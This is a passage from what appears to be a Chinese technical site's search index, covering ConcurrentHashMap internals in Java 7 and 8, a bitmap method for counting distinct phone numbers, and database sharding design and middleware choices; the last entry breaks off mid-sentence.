segments[0]  this.segments = ss; } 总结一下在 Java 7 中 ConcurrnetHashMap 的初始化逻辑。\n 必要参数校验。 校验并发级别 concurrencyLevel 大小，如果大于最大值，重置为最大值。无参构造默认值是 16. 寻找并发级别 concurrencyLevel 之上最近的 2 的幂次方值，作为初始化容量大小，默认是 16。 记录 segmentShift 偏移量，这个值为【容量 = 2 的N次方】中的 N，在后面 Put 时计算位置时会用到。默认是 32 - sshift = 28. 记录 segmentMask，默认是 ssize - 1 = 16 -1 = 15. 初始化 segments[0]，默认大小为 2，负载因子 0.75，扩容阀值是 2*0.75=1.5，插入第二个值时才会进行扩容。  3. put    接着上面的初始化参数继续查看 put 方法源码。\n/** * Maps the specified key to the specified value in this table. * Neither the key nor the value can be null. * * \u0026lt;p\u0026gt; The value can be retrieved by calling the \u0026lt;tt\u0026gt;get\u0026lt;/tt\u0026gt; method * with a key that is equal to the original key. * * @param key key with which the specified value is to be associated * @param value value to be associated with the specified key * @return the previous value associated with \u0026lt;tt\u0026gt;key\u0026lt;/tt\u0026gt;, or * \u0026lt;tt\u0026gt;null\u0026lt;/tt\u0026gt; if there was no mapping for \u0026lt;tt\u0026gt;key\u0026lt;/tt\u0026gt; * @throws NullPointerException if the specified key or value is null */ public V put(K key, V value) { Segment\u0026lt;K,V\u0026gt; s; if (value == null) throw new NullPointerException(); int hash = hash(key); // hash 值无符号右移 28位（初始化时获得），然后与 segmentMask=15 做与运算  // 其实也就是把高4位与segmentMask（1111）做与运算  int j = (hash \u0026gt;\u0026gt;\u0026gt; segmentShift) \u0026amp; segmentMask; if ((s = (Segment\u0026lt;K,V\u0026gt;)UNSAFE.getObject // nonvolatile; recheck  (segments, (j \u0026lt;\u0026lt; SSHIFT) + SBASE)) == null) // in ensureSegment  // 如果查找到的 Segment 为空，初始化  s = ensureSegment(j); return s.put(key, hash, value, false); } /** * Returns the segment for the given index, creating it and * recording in segment table (via CAS) if not already present. * * @param k the index * @return the segment */ @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private Segment\u0026lt;K,V\u0026gt; ensureSegment(int k) { final Segment\u0026lt;K,V\u0026gt;[] ss = this.segments; long u = (k \u0026lt;\u0026lt; SSHIFT) + SBASE; // raw offset  Segment\u0026lt;K,V\u0026gt; seg; // 判断 u 位置的 Segment 是否为null  if ((seg = (Segment\u0026lt;K,V\u0026gt;)UNSAFE.getObjectVolatile(ss, u)) == null) { Segment\u0026lt;K,V\u0026gt; proto = ss[0]; // use segment 0 as prototype  // 获取0号 segment 里的 HashEntry\u0026lt;K,V\u0026gt; 初始化长度  int cap = proto.table.length; // 获取0号 segment 里的 hash 表里的扩容负载因子，所有的 segment 的 loadFactor 是相同的  float lf = proto.loadFactor; // 计算扩容阀值  int threshold = (int)(cap * lf); // 创建一个 cap 容量的 HashEntry 数组  HashEntry\u0026lt;K,V\u0026gt;[] tab = (HashEntry\u0026lt;K,V\u0026gt;[])new HashEntry[cap]; if ((seg = (Segment\u0026lt;K,V\u0026gt;)UNSAFE.getObjectVolatile(ss, u)) == null) { // recheck  // 再次检查 u 位置的 Segment 是否为null，因为这时可能有其他线程进行了操作  Segment\u0026lt;K,V\u0026gt; s = new Segment\u0026lt;K,V\u0026gt;(lf, threshold, tab); // 自旋检查 u 位置的 Segment 是否为null  while ((seg = (Segment\u0026lt;K,V\u0026gt;)UNSAFE.getObjectVolatile(ss, u)) == null) { // 使用CAS 赋值，只会成功一次  if (UNSAFE.compareAndSwapObject(ss, u, null, seg = s)) break; } } } return seg; } 上面的源码分析了 ConcurrentHashMap 在 put 一个数据时的处理流程，下面梳理下具体流程。\n  计算要 put 的 key 的位置，获取指定位置的 Segment。\n  如果指定位置的 Segment 为空，则初始化这个 Segment.\n初始化 Segment 流程：\n 检查计算得到的位置的 Segment 是否为null. 为 null 继续初始化，使用 Segment[0] 的容量和负载因子创建一个 HashEntry 数组。 再次检查计算得到的指定位置的 Segment 是否为null. 使用创建的 HashEntry 数组初始化这个 Segment. 自旋判断计算得到的指定位置的 Segment 是否为null，使用 CAS 在这个位置赋值为 Segment.    Segment.put 插入 key,value 值。\n  上面探究了获取 Segment 段和初始化 Segment 段的操作。最后一行的 Segment 的 put 方法还没有查看，继续分析。\nfinal V put(K key, int hash, V value, boolean onlyIfAbsent) { // 获取 ReentrantLock 独占锁，获取不到，scanAndLockForPut 获取。  HashEntry\u0026lt;K,V\u0026gt; node = tryLock() ? null : scanAndLockForPut(key, hash, value); V oldValue; try { HashEntry\u0026lt;K,V\u0026gt;[] tab = table; // 计算要put的数据位置  int index = (tab.length - 1) \u0026amp; hash; // CAS 获取 index 坐标的值  HashEntry\u0026lt;K,V\u0026gt; first = entryAt(tab, index); for (HashEntry\u0026lt;K,V\u0026gt; e = first;;) { if (e != null) { // 检查是否 key 已经存在，如果存在，则遍历链表寻找位置，找到后替换 value  K k; if ((k = e.key) == key || (e.hash == hash \u0026amp;\u0026amp; key.equals(k))) { oldValue = e.value; if (!onlyIfAbsent) { e.value = value; ++modCount; } break; } e = e.next; } else { // first 有值没说明 index 位置已经有值了，有冲突，链表头插法。  if (node != null) node.setNext(first); else node = new HashEntry\u0026lt;K,V\u0026gt;(hash, key, value, first); int c = count + 1; // 容量大于扩容阀值，小于最大容量，进行扩容  if (c \u0026gt; threshold \u0026amp;\u0026amp; tab.length \u0026lt; MAXIMUM_CAPACITY) rehash(node); else // index 位置赋值 node，node 可能是一个元素，也可能是一个链表的表头  setEntryAt(tab, index, node); ++modCount; count = c; oldValue = null; break; } } } finally { unlock(); } return oldValue; } 由于 Segment 继承了 ReentrantLock，所以 Segment 内部可以很方便的获取锁，put 流程就用到了这个功能。\n  tryLock() 获取锁，获取不到使用 scanAndLockForPut 方法继续获取。\n  计算 put 的数据要放入的 index 位置，然后获取这个位置上的 HashEntry 。\n  遍历 put 新元素，为什么要遍历？因为这里获取的 HashEntry 可能是一个空元素，也可能是链表已存在，所以要区别对待。\n如果这个位置上的 HashEntry 不存在：\n 如果当前容量大于扩容阀值，小于最大容量，进行扩容。 直接头插法插入。  如果这个位置上的 HashEntry 存在：\n 判断链表当前元素 Key 和 hash 值是否和要 put 的 key 和 hash 值一致。一致则替换值 不一致，获取链表下一个节点，直到发现相同进行值替换，或者链表表里完毕没有相同的。  如果当前容量大于扩容阀值，小于最大容量，进行扩容。 直接链表头插法插入。      如果要插入的位置之前已经存在，替换后返回旧值，否则返回 null.\n  这里面的第一步中的 scanAndLockForPut 操作这里没有介绍，这个方法做的操作就是不断的自旋 tryLock() 获取锁。当自旋次数大于指定次数时，使用 lock() 阻塞获取锁。在自旋时顺表获取下 hash 位置的 HashEntry。\nprivate HashEntry\u0026lt;K,V\u0026gt; scanAndLockForPut(K key, int hash, V value) { HashEntry\u0026lt;K,V\u0026gt; first = entryForHash(this, hash); HashEntry\u0026lt;K,V\u0026gt; e = first; HashEntry\u0026lt;K,V\u0026gt; node = null; int retries = -1; // negative while locating node  // 自旋获取锁  while (!tryLock()) { HashEntry\u0026lt;K,V\u0026gt; f; // to recheck first below  if (retries \u0026lt; 0) { if (e == null) { if (node == null) // speculatively create node  node = new HashEntry\u0026lt;K,V\u0026gt;(hash, key, value, null); retries = 0; } else if (key.equals(e.key)) retries = 0; else e = e.next; } else if (++retries \u0026gt; MAX_SCAN_RETRIES) { // 自旋达到指定次数后，阻塞等到只到获取到锁  lock(); break; } else if ((retries \u0026amp; 1) == 0 \u0026amp;\u0026amp; (f = entryForHash(this, hash)) != first) { e = first = f; // re-traverse if entry changed  retries = -1; } } return node; } 4. 扩容 rehash    ConcurrentHashMap 的扩容只会扩容到原来的两倍。老数组里的数据移动到新的数组时，位置要么不变，要么变为 index+ oldSize，参数里的 node 会在扩容之后使用链表头插法插入到指定位置。\nprivate void rehash(HashEntry\u0026lt;K,V\u0026gt; node) { HashEntry\u0026lt;K,V\u0026gt;[] oldTable = table; // 老容量  int oldCapacity = oldTable.length; // 新容量，扩大两倍  int newCapacity = oldCapacity \u0026lt;\u0026lt; 1; // 新的扩容阀值  threshold = (int)(newCapacity * loadFactor); // 创建新的数组  HashEntry\u0026lt;K,V\u0026gt;[] newTable = (HashEntry\u0026lt;K,V\u0026gt;[]) new HashEntry[newCapacity]; // 新的掩码，默认2扩容后是4，-1是3，二进制就是11。  int sizeMask = newCapacity - 1; for (int i = 0; i \u0026lt; oldCapacity ; i++) { // 遍历老数组  HashEntry\u0026lt;K,V\u0026gt; e = oldTable[i]; if (e != null) { HashEntry\u0026lt;K,V\u0026gt; next = e.next; // 计算新的位置，新的位置只可能是不便或者是老的位置+老的容量。  int idx = e.hash \u0026amp; sizeMask; if (next == null) // Single node on list  // 如果当前位置还不是链表，只是一个元素，直接赋值  newTable[idx] = e; else { // Reuse consecutive sequence at same slot  // 如果是链表了  HashEntry\u0026lt;K,V\u0026gt; lastRun = e; int lastIdx = idx; // 新的位置只可能是不便或者是老的位置+老的容量。  // 遍历结束后，lastRun 后面的元素位置都是相同的  for (HashEntry\u0026lt;K,V\u0026gt; last = next; last != null; last = last.next) { int k = last.hash \u0026amp; sizeMask; if (k != lastIdx) { lastIdx = k; lastRun = last; } } // ，lastRun 后面的元素位置都是相同的，直接作为链表赋值到新位置。  newTable[lastIdx] = lastRun; // Clone remaining nodes  for (HashEntry\u0026lt;K,V\u0026gt; p = e; p != lastRun; p = p.next) { // 遍历剩余元素，头插法到指定 k 位置。  V v = p.value; int h = p.hash; int k = h \u0026amp; sizeMask; HashEntry\u0026lt;K,V\u0026gt; n = newTable[k]; newTable[k] = new HashEntry\u0026lt;K,V\u0026gt;(h, p.key, v, n); } } } } // 头插法插入新的节点  int nodeIndex = node.hash \u0026amp; sizeMask; // add the new node  node.setNext(newTable[nodeIndex]); newTable[nodeIndex] = node; table = newTable; } 有些同学可能会对最后的两个 for 循环有疑惑，这里第一个 for 是为了寻找这样一个节点，这个节点后面的所有 next 节点的新位置都是相同的。然后把这个作为一个链表赋值到新位置。第二个 for 循环是为了把剩余的元素通过头插法插入到指定位置链表。这样实现的原因可能是基于概率统计，有深入研究的同学可以发表下意见。\n5. get    到这里就很简单了，get 方法只需要两步即可。\n 计算得到 key 的存放位置。 遍历指定位置查找相同 key 的 value 值。  public V get(Object key) { Segment\u0026lt;K,V\u0026gt; s; // manually integrate access methods to reduce overhead  HashEntry\u0026lt;K,V\u0026gt;[] tab; int h = hash(key); long u = (((h \u0026gt;\u0026gt;\u0026gt; segmentShift) \u0026amp; segmentMask) \u0026lt;\u0026lt; SSHIFT) + SBASE; // 计算得到 key 的存放位置  if ((s = (Segment\u0026lt;K,V\u0026gt;)UNSAFE.getObjectVolatile(segments, u)) != null \u0026amp;\u0026amp; (tab = s.table) != null) { for (HashEntry\u0026lt;K,V\u0026gt; e = (HashEntry\u0026lt;K,V\u0026gt;) UNSAFE.getObjectVolatile (tab, ((long)(((tab.length - 1) \u0026amp; h)) \u0026lt;\u0026lt; TSHIFT) + TBASE); e != null; e = e.next) { // 如果是链表，遍历查找到相同 key 的 value。  K k; if ((k = e.key) == key || (e.hash == h \u0026amp;\u0026amp; key.equals(k))) return e.value; } } return null; } 2. ConcurrentHashMap 1.8    1. 存储结构    可以发现 Java8 的 ConcurrentHashMap 相对于 Java7 来说变化比较大，不再是之前的 Segment 数组 + HashEntry 数组 + 链表，而是 Node 数组 + 链表 / 红黑树。当冲突链表达到一定长度时，链表会转换成红黑树。\n2. 初始化 initTable    /** * Initializes table, using the size recorded in sizeCtl. */ private final Node\u0026lt;K,V\u0026gt;[] initTable() { Node\u0026lt;K,V\u0026gt;[] tab; int sc; while ((tab = table) == null || tab.length == 0) { ／／　如果 sizeCtl \u0026lt; 0 ,说明另外的线程执行CAS 成功，正在进行初始化。 if ((sc = sizeCtl) \u0026lt; 0) // 让出 CPU 使用权  Thread.yield(); // lost initialization race; just spin  else if (U.compareAndSwapInt(this, SIZECTL, sc, -1)) { try { if ((tab = table) == null || tab.length == 0) { int n = (sc \u0026gt; 0) ? sc : DEFAULT_CAPACITY; @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Node\u0026lt;K,V\u0026gt;[] nt = (Node\u0026lt;K,V\u0026gt;[])new Node\u0026lt;?,?\u0026gt;[n]; table = tab = nt; sc = n - (n \u0026gt;\u0026gt;\u0026gt; 2); } } finally { sizeCtl = sc; } break; } } return tab; } 从源码中可以发现 ConcurrentHashMap 的初始化是通过自旋和 CAS 操作完成的。里面需要注意的是变量 sizeCtl ，它的值决定着当前的初始化状态。\n -1 说明正在初始化 -N 说明有N-1个线程正在进行扩容 表示 table 初始化大小，如果 table 没有初始化 表示 table 容量，如果 table　已经初始化。  3. put    直接过一遍 put 源码。\npublic V put(K key, V value) { return putVal(key, value, false); } /** Implementation for put and putIfAbsent */ final V putVal(K key, V value, boolean onlyIfAbsent) { // key 和 value 不能为空  if (key == null || value == null) throw new NullPointerException(); int hash = spread(key.hashCode()); int binCount = 0; for (Node\u0026lt;K,V\u0026gt;[] tab = table;;) { // f = 目标位置元素  Node\u0026lt;K,V\u0026gt; f; int n, i, fh;// fh 后面存放目标位置的元素 hash 值  if (tab == null || (n = tab.length) == 0) // 数组桶为空，初始化数组桶（自旋+CAS)  tab = initTable(); else if ((f = tabAt(tab, i = (n - 1) \u0026amp; hash)) == null) { // 桶内为空，CAS 放入，不加锁，成功了就直接 break 跳出  if (casTabAt(tab, i, null,new Node\u0026lt;K,V\u0026gt;(hash, key, value, null))) break; // no lock when adding to empty bin  } else if ((fh = f.hash) == MOVED) tab = helpTransfer(tab, f); else { V oldVal = null; // 使用 synchronized 加锁加入节点  synchronized (f) { if (tabAt(tab, i) == f) { // 说明是链表  if (fh \u0026gt;= 0) { binCount = 1; // 循环加入新的或者覆盖节点  for (Node\u0026lt;K,V\u0026gt; e = f;; ++binCount) { K ek; if (e.hash == hash \u0026amp;\u0026amp; ((ek = e.key) == key || (ek != null \u0026amp;\u0026amp; key.equals(ek)))) { oldVal = e.val; if (!onlyIfAbsent) e.val = value; break; } Node\u0026lt;K,V\u0026gt; pred = e; if ((e = e.next) == null) { pred.next = new Node\u0026lt;K,V\u0026gt;(hash, key, value, null); break; } } } else if (f instanceof TreeBin) { // 红黑树  Node\u0026lt;K,V\u0026gt; p; binCount = 2; if ((p = ((TreeBin\u0026lt;K,V\u0026gt;)f).putTreeVal(hash, key, value)) != null) { oldVal = p.val; if (!onlyIfAbsent) p.val = value; } } } } if (binCount != 0) { if (binCount \u0026gt;= TREEIFY_THRESHOLD) treeifyBin(tab, i); if (oldVal != null) return oldVal; break; } } } addCount(1L, binCount); return null; }   根据 key 计算出 hashcode 。\n  判断是否需要进行初始化。\n  即为当前 key 定位出的 Node，如果为空表示当前位置可以写入数据，利用 CAS 尝试写入，失败则自旋保证成功。\n  如果当前位置的 hashcode == MOVED == -1,则需要进行扩容。\n  如果都不满足，则利用 synchronized 锁写入数据。\n  如果数量大于 TREEIFY_THRESHOLD 则要转换为红黑树。\n  4. get    get 流程比较简单，直接过一遍源码。\npublic V get(Object key) { Node\u0026lt;K,V\u0026gt;[] tab; Node\u0026lt;K,V\u0026gt; e, p; int n, eh; K ek; // key 所在的 hash 位置  int h = spread(key.hashCode()); if ((tab = table) != null \u0026amp;\u0026amp; (n = tab.length) \u0026gt; 0 \u0026amp;\u0026amp; (e = tabAt(tab, (n - 1) \u0026amp; h)) != null) { // 如果指定位置元素存在，头结点hash值相同  if ((eh = e.hash) == h) { if ((ek = e.key) == key || (ek != null \u0026amp;\u0026amp; key.equals(ek))) // key hash 值相等，key值相同，直接返回元素 value  return e.val; } else if (eh \u0026lt; 0) // 头结点hash值小于0，说明正在扩容或者是红黑树，find查找  return (p = e.find(h, key)) != null ? p.val : null; while ((e = e.next) != null) { // 是链表，遍历查找  if (e.hash == h \u0026amp;\u0026amp; ((ek = e.key) == key || (ek != null \u0026amp;\u0026amp; key.equals(ek)))) return e.val; } } return null; } 总结一下 get 过程：\n 根据 hash 值计算位置。 查找到指定位置，如果头节点就是要找的，直接返回它的 value. 如果头节点 hash 值小于 0 ，说明正在扩容或者是红黑树，查找之。 如果是链表，遍历查找之。  总结：\n总的来说 ConcurrentHashMap 在 Java8 中相对于 Java7 来说变化还是挺大的，\n3. 总结    Java7 中 ConcurrentHashMap 使用的分段锁，也就是每一个 Segment 上同时只有一个线程可以操作，每一个 Segment 都是一个类似 HashMap 数组的结构，它可以扩容，它的冲突会转化为链表。但是 Segment 的个数一但初始化就不能改变。\nJava8 中的 ConcurrentHashMap 使用的 Synchronized 锁加 CAS 的机制。结构也由 Java7 中的 Segment 数组 + HashEntry 数组 + 链表 进化成了 Node 数组 + 链表 / 红黑树，Node 是类似于一个 HashEntry 的结构。它的冲突再达到一定大小时会转化成红黑树，在冲突小于一定数量时又退回链表。\n有些同学可能对 Synchronized 的性能存在疑问，其实 Synchronized 锁自从引入锁升级策略后，性能不再是问题，有兴趣的同学可以自己了解下 Synchronized 的锁升级。\n"},{"id":143,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/count-different-phone-numbers/","title":"count-different-phone-numbers","parent":"大数据","content":"如何统计不同电话号码的个数？    题目描述    已知某个文件内包含一些电话号码，每个号码为 8 位数字，统计不同号码的个数。\n解答思路    这道题本质还是求解数据重复的问题，对于这类问题，一般首先考虑位图法。\n对于本题，8 位电话号码可以表示的号码个数为 108 个，即 1 亿个。我们每个号码用一个 bit 来表示，则总共需要 1 亿个 bit，内存占用约 100M。\n思路如下：\n申请一个位图数组，长度为 1 亿，初始化为 0。然后遍历所有电话号码，把号码对应的位图中的位置置为 1。遍历完成后，如果 bit 为 1，则表示这个电话号码在文件中存在，否则不存在。bit 值为 1 的数量即为 不同电话号码的个数。\n方法总结    求解数据重复问题，记得考虑位图法。\n"},{"id":144,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/database-shard/","title":"database-shard","parent":"高并发","content":"面试题    为什么要分库分表（设计高并发系统的时候，数据库层面该如何设计）？用过哪些分库分表中间件？不同的分库分表中间件都有什么优点和缺点？你们具体是如何对数据库如何进行垂直拆分或水平拆分的？\n面试官心理分析    其实这块肯定是扯到高并发了，因为分库分表一定是为了支撑高并发、数据量大两个问题的。而且现在说实话，尤其是互联网类的公司面试，基本上都会来这么一下，分库分表如此普遍的技术问题，不问实在是不行，而如果你不知道那也实在是说不过去！\n面试题剖析    为什么要分库分表？（设计高并发系统的时候，数据库层面该如何设计？）    说白了，分库分表是两回事儿，大家可别搞混了，可能是光分库不分表，也可能是光分表不分库，都有可能。\n我先给大家抛出来一个场景。\n假如我们现在是一个小创业公司（或者是一个 BAT 公司刚兴起的一个新部门），现在注册用户就 20 万，每天活跃用户就 1 万，每天单表数据量就 1000，然后高峰期每秒钟并发请求最多就 10 个。我的天，就这种系统，随便找一个有几年工作经验的，然后带几个刚培训出来的，随便干干都可以。\n结果没想到我们运气居然这么好，碰上个 CEO 带着我们走上了康庄大道，业务发展迅猛，过了几个月，注册用户数达到了 2000 万！每天活跃用户数 100 万！每天单表数据量 10 万条！高峰期每秒最大请求达到 1000！同时公司还顺带着融资了两轮，进账了几个亿人民币啊！公司估值达到了惊人的几亿美金！这是小独角兽的节奏！\n好吧，没事，现在大家感觉压力已经有点大了，为啥呢？因为每天多 10 万条数据，一个月就多 300 万条数据，现在咱们单表已经几百万数据了，马上就破千万了。但是勉强还能撑着。高峰期请求现在是 1000，咱们线上部署了几台机器，负载均衡搞了一下，数据库撑 1000QPS 也还凑合。但是大家现在开始感觉有点担心了，接下来咋整呢\u0026hellip;\u0026hellip;\n再接下来几个月，我的天，CEO 太牛逼了，公司用户数已经达到 1 亿，公司继续融资几十亿人民币啊！公司估值达到了惊人的几十亿美金，成为了国内今年最牛逼的明星创业公司！天，我们太幸运了。\n但是我们同时也是不幸的，因为此时每天活跃用户数上千万，每天单表新增数据多达 50 万，目前一个表总数据量都已经达到了两三千万了！扛不住啊！数据库磁盘容量不断消耗掉！高峰期并发达到惊人的 5000~8000 ！别开玩笑了，哥。我跟你保证，你的系统支撑不到现在，已经挂掉了！\n好吧，所以你看到这里差不多就理解分库分表是怎么回事儿了，实际上这是跟着你的公司业务发展走的，你公司业务发展越好，用户就越多，数据量越大，请求量越大，那你单个数据库一定扛不住。\n分表    比如你单表都几千万数据了，你确定你能扛住么？绝对不行，单表数据量太大，会极大影响你的 sql 执行的性能，到了后面你的 sql 可能就跑的很慢了。一般来说，就以我的经验来看，单表到几百万的时候，性能就会相对差一些了，你就得分表了。\n分表是啥意思？就是把一个表的数据放到多个表中，然后查询的时候你就查一个表。比如按照用户 id 来分表，将一个用户的数据就放在一个表中。然后操作的时候你对一个用户就操作那个表就好了。这样可以控制每个表的数据量在可控的范围内，比如每个表就固定在 200 万以内。\n分库    分库是啥意思？就是你一个库一般我们经验而言，最多支撑到并发 2000，一定要扩容了，而且一个健康的单库并发值你最好保持在每秒 1000 左右，不要太大。那么你可以将一个库的数据拆分到多个库中，访问的时候就访问一个库好了。\n这就是所谓的分库分表，为啥要分库分表？你明白了吧。\n   # 分库分表前 分库分表后     并发支撑情况 MySQL 单机部署，扛不住高并发 MySQL 从单机到多机，能承受的并发增加了多倍   磁盘使用情况 MySQL 单机磁盘容量几乎撑满 拆分为多个库，数据库服务器磁盘使用率大大降低   SQL 执行性能 单表数据量太大，SQL 越跑越慢 单表数据量减少，SQL 执行效率明显提升    用过哪些分库分表中间件？不同的分库分表中间件都有什么优点和缺点？    这个其实就是看看你了解哪些分库分表的中间件，各个中间件的优缺点是啥？然后你用过哪些分库分表的中间件。\n比较常见的包括：\n Cobar TDDL Atlas Sharding-jdbc Mycat  Cobar    阿里 b2b 团队开发和开源的，属于 proxy 层方案，就是介于应用服务器和数据库服务器之间。应用程序通过 JDBC 驱动访问 Cobar 集群，Cobar 根据 SQL 和分库规则对 SQL 做分解，然后分发到 MySQL 集群不同的数据库实例上执行。早些年还可以用，但是最近几年都没更新了，基本没啥人用，差不多算是被抛弃的状态吧。而且不支持读写分离、存储过程、跨库 join 和分页等操作。\nTDDL    淘宝团队开发的，属于 client 层方案。支持基本的 crud 语法和读写分离，但不支持 join、多表查询等语法。目前使用的也不多，因为还依赖淘宝的 diamond 配置管理系统。\nAtlas    360 开源的，属于 proxy 层方案，以前是有一些公司在用的，但是确实有一个很大的问题就是社区最新的维护都在 5 年前了。所以，现在用的公司基本也很少了。\nSharding-jdbc    当当开源的，属于 client 层方案，是ShardingSphere 的 client 层方案，ShardingSphere 还提供 proxy 层的方案 Sharding-Proxy。确实之前用的还比较多一些，因为 SQL 语法支持也比较多，没有太多限制，而且截至 2019.4，已经推出到了 4.0.0-RC1 版本，支持分库分表、读写分离、分布式 id 生成、柔性事务（最大努力送达型事务、TCC 事务）。而且确实之前使用的公司会比较多一些（这个在官网有登记使用的公司，可以看到从 2017 年一直到现在，是有不少公司在用的），目前社区也还一直在开发和维护，还算是比较活跃，个人认为算是一个现在也可以选择的方案。\nMycat    基于 Cobar 改造的，属于 proxy 层方案，支持的功能非常完善，而且目前应该是非常火的而且不断流行的数据库中间件，社区很活跃，也有一些公司开始在用了。但是确实相比于 Sharding jdbc 来说，年轻一些，经历的锤炼少一些。\n总结    综上，现在其实建议考量的，就是 Sharding-jdbc 和 Mycat，这两个都可以去考虑使用。\nSharding-jdbc 这种 client 层方案的优点在于不用部署，运维成本低，不需要代理层的二次转发请求，性能很高，但是如果遇到升级啥的需要各个系统都重新升级版本再发布，各个系统都需要耦合 Sharding-jdbc 的依赖；\nMycat 这种 proxy 层方案的缺点在于需要部署，自己运维一套中间件，运维成本高，但是好处在于对于各个项目是透明的，如果遇到升级之类的都是自己中间件那里搞就行了。\n通常来说，这两个方案其实都可以选用，但是我个人建议中小型公司选用 Sharding-jdbc，client 层方案轻便，而且维护成本低，不需要额外增派人手，而且中小型公司系统复杂度会低一些，项目也没那么多；但是中大型公司最好还是选用 Mycat 这类 proxy 层方案，因为可能大公司系统和项目非常多，团队很大，人员充足，那么最好是专门弄个人来研究和维护 Mycat，然后大量项目直接透明使用即可。\n你们具体是如何对数据库如何进行垂直拆分或水平拆分的？    水平拆分的意思，就是把一个表的数据给弄到多个库的多个表里去，但是每个库的表结构都一样，只不过每个库表放的数据是不同的，所有库表的数据加起来就是全部数据。水平拆分的意义，就是将数据均匀放更多的库里，然后用多个库来扛更高的并发，还有就是用多个库的存储容量来进行扩容。\n垂直拆分的意思，就是把一个有很多字段的表给拆分成多个表，或者是多个库上去。每个库表的结构都不一样，每个库表都包含部分字段。一般来说，会将较少的访问频率很高的字段放到一个表里去，然后将较多的访问频率很低的字段放到另外一个表里去。因为数据库是有缓存的，你访问频率高的行字段越少，就可以在缓存里缓存更多的行，性能就越好。这个一般在表层面做的较多一些。\n这个其实挺常见的，不一定我说，大家很多同学可能自己都做过，把一个大表拆开，订单表、订单支付表、订单商品表。\n还有表层面的拆分，就是分表，将一个表变成 N 个表，就是让每个表的数据量控制在一定范围内，保证 SQL 的性能。否则单表数据量越大，SQL 性能就越差。一般是 200 万行左右，不要太多，但是也得看具体你怎么操作，也可能是 500 万，或者是 100 万。你的 SQL 越复杂，就最好让单表行数越少。\n好了，无论分库还是分表，上面说的那些数据库中间件都是可以支持的。就是基本上那些中间件可以做到你分库分表之后，中间件可以根据你指定的某个字段值，比如说 userid，自动路由到对应的库上去，然后再自动路由到对应的表里去。\n你就得考虑一下，你的项目里该如何分库分表？一般来说，垂直拆分，你可以在表层面来做，对一些字段特别多的表做一下拆分；水平拆分，你可以说是并发承载不了，或者是数据量太大，容量承载不了，你给拆了，按什么字段来拆，你自己想好；分表，你考虑一下，你如果哪怕是拆到每个库里去，并发和容量都 ok 了，但是每个库的表还是太大了，那么你就分表，将这个表分开，保证每个表的数据量并不是很大。\n而且这儿还有两种分库分表的方式：\n 一种是按照 range 来分，就是每个库一段连续的数据，这个一般是按比如时间范围来的，但是这种一般较少用，因为很容易产生热点问题，大量的流量都打在最新的数据上了。 或者是按照某个字段 hash 一下均匀分散，这个较为常用。  range 来分，好处在于说，扩容的时候很简单，因为你只要预备好，给每个月都准备一个库就可以了，到了一个新的月份的时候，自然而然，就会写新的库了；缺点，但是大部分的请求，都是访问最新的数据。实际生产用 range，要看场景。\nhash 分发，好处在于说，可以平均分配每个库的数据量和请求压力；坏处在于说扩容起来比较麻烦，会有一个数据迁移的过程，之前的数据需要重新计算 hash 值重新分配到不同的库或表。\n"},{"id":145,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/database-shard-dynamic-expand/","title":"database-shard-dynamic-expand","parent":"高并发","content":"面试题    如何设计可以动态扩容缩容的分库分表方案？\n面试官心理分析    对于分库分表来说，主要是面对以下问题：\n 选择一个数据库中间件，调研、学习、测试； 设计你的分库分表的一个方案，你要分成多少个库，每个库分成多少个表，比如 3 个库，每个库 4 个表； 基于选择好的数据库中间件，以及在测试环境建立好的分库分表的环境，然后测试一下能否正常进行分库分表的读写； 完成单库单表到分库分表的迁移，双写方案； 线上系统开始基于分库分表对外提供服务； 扩容了，扩容成 6 个库，每个库需要 12 个表，你怎么来增加更多库和表呢？  这个是你必须面对的一个事儿，就是你已经弄好分库分表方案了，然后一堆库和表都建好了，基于分库分表中间件的代码开发啥的都好了，测试都 ok 了，数据能均匀分布到各个库和各个表里去，而且接着你还通过双写的方案咔嚓一下上了系统，已经直接基于分库分表方案在搞了。\n那么现在问题来了，你现在这些库和表又支撑不住了，要继续扩容咋办？这个可能就是说你的每个库的容量又快满了，或者是你的表数据量又太大了，也可能是你每个库的写并发太高了，你得继续扩容。\n这都是玩儿分库分表线上必须经历的事儿。\n面试题剖析    停机扩容（不推荐）    这个方案就跟停机迁移一样，步骤几乎一致，唯一的一点就是那个导数的工具，是把现有库表的数据抽出来慢慢倒入到新的库和表里去。但是最好别这么玩儿，有点不太靠谱，因为既然分库分表就说明数据量实在是太大了，可能多达几亿条，甚至几十亿，你这么玩儿，可能会出问题。\n从单库单表迁移到分库分表的时候，数据量并不是很大，单表最大也就两三千万。那么你写个工具，多弄几台机器并行跑，1 小时数据就导完了。这没有问题。\n如果 3 个库 + 12 个表，跑了一段时间了，数据量都 1~2 亿了。光是导 2 亿数据，都要导个几个小时，6 点，刚刚导完数据，还要搞后续的修改配置，重启系统，测试验证，10 点才可以搞完。所以不能这么搞。\n优化后的方案    一开始上来就是 32 个库，每个库 32 个表，那么总共是 1024 张表。\n我可以告诉各位同学，这个分法，第一，基本上国内的互联网肯定都是够用了，第二，无论是并发支撑还是数据量支撑都没问题。\n每个库正常承载的写入并发量是 1000，那么 32 个库就可以承载 32 _ 1000 = 32000 的写并发，如果每个库承载 1500 的写并发，32 _ 1500 = 48000 的写并发，接近 5 万每秒的写入并发，前面再加一个 MQ，削峰，每秒写入 MQ 8 万条数据，每秒消费 5 万条数据。\n有些除非是国内排名非常靠前的这些公司，他们的最核心的系统的数据库，可能会出现几百台数据库的这么一个规模，128 个库，256 个库，512 个库。\n1024 张表，假设每个表放 500 万数据，在 MySQL 里可以放 50 亿条数据。\n每秒 5 万的写并发，总共 50 亿条数据，对于国内大部分的互联网公司来说，其实一般来说都够了。\n谈分库分表的扩容，第一次分库分表，就一次性给他分个够，32 个库，1024 张表，可能对大部分的中小型互联网公司来说，已经可以支撑好几年了。\n一个实践是利用 32 * 32 来分库分表，即分为 32 个库，每个库里一个表分为 32 张表。一共就是 1024 张表。根据某个 id 先根据 32 取模路由到库，再根据 32 取模路由到库里的表。\n   orderId id % 32 (库) id / 32 % 32 (表)     259 3 8   1189 5 5   352 0 11   4593 17 15    刚开始的时候，这个库可能就是逻辑库，建在一个数据库上的，就是一个 MySQL 服务器可能建了 n 个库，比如 32 个库。后面如果要拆分，就是不断在库和 MySQL 